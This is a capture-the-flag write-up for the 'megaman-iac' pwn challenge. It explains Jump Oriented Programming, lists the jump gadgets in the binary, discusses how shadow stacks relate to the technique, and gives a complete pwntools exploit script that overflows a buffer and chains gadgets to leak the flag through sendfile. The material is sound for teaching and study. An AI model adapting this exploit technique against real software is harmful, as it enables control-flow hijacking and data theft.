---
title: "CYBERMAZE 5 (2025) - megaman-iac ( intended solve ) "
date: 2025-12-02 10:10:00 +0100
categories: [cybermaze_v5]
tags: [pwn, jop, writeup , spark , cybermaze_v5 , hard , isetcom]
---


# [ megaman-iac ] Writeup  


**Category:** [pwn]  
**Points:** [500]        
**Author:** 4n7h4r4x  


[You can download the files from my github and replay them !](https://github.com/YahyaMouelhi/cybermaze_v5)


![challenge](/assets/images/cybermaze_v5/megamaniac/)


## Tools Used

- `gdb` / `ropper` / `ROPgadget` / `ghidra` 
- `python3 (pwntools)` for exploit scripting  

---

## Analysis

This a hard challenge that requires the player to apply the **JOP** technique ( **Jump Oriented Programming** ) , i will explain in details how this technique works and what does it needs and walk through the technical knowledge step by step later , The good thing is that this challenge is clear and straighforward , dosen't require reversing or long code analysis ... 
As usual let's run **file** and **checksec** to see what we are working with :

![file and checksec](/assets/images/cybermaze_v5/megamaniac/)

Intresting , let's open up gdb and see what we have !

![gdb output](/assets/images/cybermaze_v5/megamaniac/)

There is no intresting function except **trap** , let's disassemble it and see what it does :

![disass trap](/assets/images/cybermaze_v5/megamaniac/)

Let's see the pseudo code of this function from ghidra :

![ghidra trap](/assets/images/cybermaze_v5/megamaniac/)

As we can see the program shows a message , then prints random values using sendfile , puts another message and open the **flag.txt** for us and then reads input from the user (600 bytes) , and as we can see it reads more than the buffer size **+80 bytes** , the first thing someone should think of is use **write** or **sendfile** to print the content of the **flag.txt**
let's see what gadgets we have .

If you use ropper , it will output **102** gadgets , u'll realise that there are almost no useful gadgets except the **leave ; ret** or **pop rbp...** which allow us to do **stack pivot** , but we'll keep this for the unintended solve haha :D 

So we can see it's not a **ROP chain** we litterally have no **pop** nor **syscall ; ret** so we need to think of sthg else , there's no **libc** in the handout so it's not a **ret2libc** , we can't execute shellcode because **NX** is enabled , to the point it would seem that the callenge is broken ( it's really not at all ) players might think of many more techniques but will be blocked at a certain point , let's analyse deeper the gadgets using **ROPgadget** , because **ropper** mainly focuses on gadgets that ends with **ret** , let's use **ROPgadget** : 

![ropgadget output](/assets/images/cybermaze_v5/megamaniac/)

![ropgadget output](/assets/images/cybermaze_v5/megamaniac/)

There is a total of **128** unique gadgets , but when we used ropper it showed a total of **102** gadgets , **26** new gadgets ?? that might be very intersting , **ROPgadget** have an option that shows gadgets unrelated to **rop** : it's **--norop** let's use it and see what jmp gadgets the binary have :

```bash
┌──(secenv)─(yahya㉿4n7h4r4x)-[~/…/cm2025/Arcade/cm2025_pwn/megaman-iac]
└─$ ROPgadget --binary ./megaman-iac --norop| grep jmp
...

```

Mmmm a lot of jump gadgets there , either to **rax** or to **r10** or to random values that dosen't intrests us , we need to ask our self a question , can we control one of them ? The answer is **yes** we can control **r10** ( with the **pop r10**) ! That's great news we are getting closer and closer to what we want , let's grep only the gadgets related to **r10** and that are intresting in our case :

```bash
┌──(secenv)─(yahya㉿4n7h4r4x)-[~/…/cm2025/Arcade/cm2025_pwn/megaman-iac]
└─$ ROPgadget --binary ./megaman-iac --norop| grep r10

0x00000000004011b4 : add ecx, 4 ; jmp r10
0x00000000004011b3 : add rcx, 4 ; jmp r10
0x00000000004011bb : imul ecx, ecx ; jmp r10
0x00000000004011cc : imul edi, ecx ; jmp r10
0x00000000004011ba : imul rcx, rcx ; jmp r10
0x00000000004011cb : imul rdi, rcx ; jmp r10
0x00000000004011c2 : inc edi ; jmp r10
0x00000000004011c1 : inc rdi ; jmp r10
0x00000000004011a6 : jmp qword ptr [r10]
0x000000000040118e : jmp r10
0x00000000004011aa : mov ecx, 0 ; jmp r10
0x0000000000401192 : mov edx, 0 ; jmp r10
0x000000000040118c : mov esi, edx ; jmp r10
0x0000000000401187 : mov rbp, rsp ; nop ; mov rsi, r10 ; jmp r10
0x00000000004011a9 : mov rcx, 0 ; jmp r10
0x0000000000401191 : mov rdx, 0 ; jmp r10
0x000000000040118b : mov rsi, r10 ; jmp r10
0x000000000040118a : nop ; mov rsi, r10 ; jmp r10
0x000000000040119e : pop r10 ; add rsi, 0x10 ; jmp qword ptr [rsi]
0x00000000004011c7 : pop rsi ; jmp r10

```

I only left the intresting gadgets that are related to **r10** and they will be super handy and you''ll see why , but before we start trying to craft our payload , let's take a step back and explain how **JOP ( Jump Oriented Programming )** works in details !

## How Jump Oriented Programming works ?

To perform  **JOP** we need **2** main things :
- A gadget that allows us to **populate** a **register** then do an operation and **jump** to it
- Another gadget that will do a certain operation then jumps to that **register** that we **populated**

Here's a picture that might simplify what i was saying :

![example of jop mechanism](/assets/images/cybermaze_v5/megamaniac/)

If we can put useful instruction that ends with **jmp** to somewhere we can control , we can build this weird machine that does what we want , here's an example of real gadgets :

![first run](/assets/images/cybermaze_v5/megamaniac/)


![second run](/assets/images/cybermaze_v5/megamaniac/)

![third run](/assets/images/cybermaze_v5/megamaniac/)

We won't always find gadget that increments what we need by 8 , sometimes it'll be more , or even less than 8 !! and depending on what we get we'll adapt , but i hope the visual example made it a bit simpler how all of this will work , but now is the big question , what's our goal to get the **flag.txt** ?

If we go back to the program we'll see :

![trap pseudo c code](/assets/images/cybermaze_v5/megamaniac/)

The program have already opened **flag.txt** for us and also opened "/dev/urandom" so there is a total of 2 opened files the "/dev/urandom" will have a **fd** = 3 and the **flag.txt** will have a **fd** = **4** , the program printed some garbage random bytes using **sendfile** copies data directly from a file descriptor to a socket descriptor, all inside the kernel, avoiding expensive user-space copies , and we can use it exactly like write !

But wait how are exactly gonna populkate the needed registers for **sendfile** ? 


## Shadow Stack

A shadow stack is a protected, kernel- or hardware-managed stack that stores a parallel copy of all legitimate return addresses during program execution. On every ret, the CPU compares the return address on the real stack with the one in the shadow stack; if they differ, execution halts. Because the shadow stack is isolated from normal memory writes, attackers cannot simply overwrite return addresses to hijack control flow, making classic ROP significantly harder.

In the context of JOP, the shadow stack offers little resistance because JOP chains avoid ret entirely and instead rely on indirect jumps (jmp r10, jmp [rsi], dispatch tables ... ). Since the shadow stack only validates return instructions—not arbitrary jumps—JOP execution proceeds without triggering a mismatch, allowing an attacker to redirect control flow through unprotected jump gadgets even when a shadow stack is fully enforced.

So to summarize , the last function that was called in the trap function was : **read(0 , buffer , 600);**
so if we jump from a place to another the **registers** values won't change meaning **rdi** will always be **0** , **rsi** will always be the address of **buffer** ( our input ) !! and finally **rdx** will be 600 , if we have the right gadgets to edit them to what we need them to be ( WE DO ! ) , we'll be able to set up the correct arguments for the **sendfile** function and get the **flag.txt**

## Approach

Here i will show you the useful and needed gadgets for the exploit to work :

```bash

add_rcx_4 = 0x00000000004011b3 : add rcx, 4 ; jmp r10
mul_rcx_rcx = 0x00000000004011ba : imul rcx, rcx ; jmp r10
mul_rdi_rcx = 0x00000000004011cb : imul rdi, rcx ; jmp r10
inc_rdi = 0x00000000004011c1 : inc rdi ; jmp r10
zero_rcx = 0x00000000004011a9 : mov rcx, 0 ; jmp r10
zero_rdx = 0x0000000000401191 : mov rdx, 0 ; jmp r10
dispatch = 0x000000000040119e : pop r10 ; add rsi, 0x10 ; jmp qword ptr [rsi]
pop_rsi = 0x00000000004011c7 : pop rsi ; jmp r10
dispatch_gadget = 0x00000000004011a0 : add rsi, 0x10 ; jmp qword ptr [rsi]

```

As we can see in our case the main 2 **registers** are **rsi** and **r10** and we can populate them with whatever we need , we also see that we can do some operations on **rdi** **rdx** and **rcx** and set them aswell to what we need ! and since the last value that was in **rsi** is the address to our input , it means we can **inject** the gadgets we wanna execute there !

So our goal now is to call **sendfile(1 , 3 , 0 , big number)** , now we can start crafting our exploit 

A great thing to keep in mind is that **we must leave popping/changing rsi the last step** because **rsi** points to our gadgets and if we edited it in beginning the **jumping chain** won't continue , also as we can see in our case **rsi is incrementing by 16** so we need to put **8 bytes** between a gadget and another ( we can fill them with anything dosen't really matter) , and yeah that's pretty much for this challenge , i added **exit** in the end so the program have a **clean exit** it's optional xD !


## Exploitation / Solution


```python

from pwn import *

context.arch = "amd64"
context.os = "linux"
context.binary = elf = ELF("./megaman-iac")

#p = remote("localhost" , 6111)
p = elf.process()
#p = gdb.debug("./megaman")

add_rcx_4 = 0x00000000004011b3
mul_rcx_rcx = 0x00000000004011ba
mul_rdi_rcx = 0x00000000004011cb
inc_rdi = 0x00000000004011c1
zero_rcx = 0x00000000004011a9
zero_rdx = 0x0000000000401191
dispatch = 0x000000000040119e
pop_rsi = 0x00000000004011c7
dispatch_gadget = 0x00000000004011a0

sendfile = elf.symbols["sendfile"]
exit = elf.symbols["exit"]

offset = 0x218
fd = 4

pay = b"A"*16

pay += p64(zero_rcx) * 2 + p64(mul_rdi_rcx) * 2 + p64(inc_rdi) * 2      # rcx = 0 & rdi = rdi*rcx = 0
pay += p64(zero_rdx) * 2                                                # rdx = 0
pay += p64(add_rcx_4) * 12 + p64(mul_rcx_rcx) * 2                       # rcx =  4*(12/2) = 24 -> rcx = rcx*rcx = 24*24 = 576
pay += p64(dispatch) * 2 + p64(pop_rsi) * 2                             # rsi = 3 (fd) later

pay = pay.ljust(offset , b"A")
pay += p64(dispatch)
pay += p64(dispatch_gadget)
pay += p64(sendfile)
pay += p64(fd)
pay += p64(exit)     # use exit for a clean exit

p.recvuntil(b"blue kid")
p.send(pay)

p.interactive()

```

![solver output](/assets/images/cybermaze_v5/megamaniac/)

## Helpful resources

[Jump oriented programming video by PWNCOLLEGE](https://youtu.be/5SLPaYOVMBw?si=MvfWgZ9NJc1b61vp) <br>
[Reading material that can be useful](https://www.willsroot.io/2019/09/jump-oriented-programming-and-call.html)

- Thanks for reading hope this was helpful !
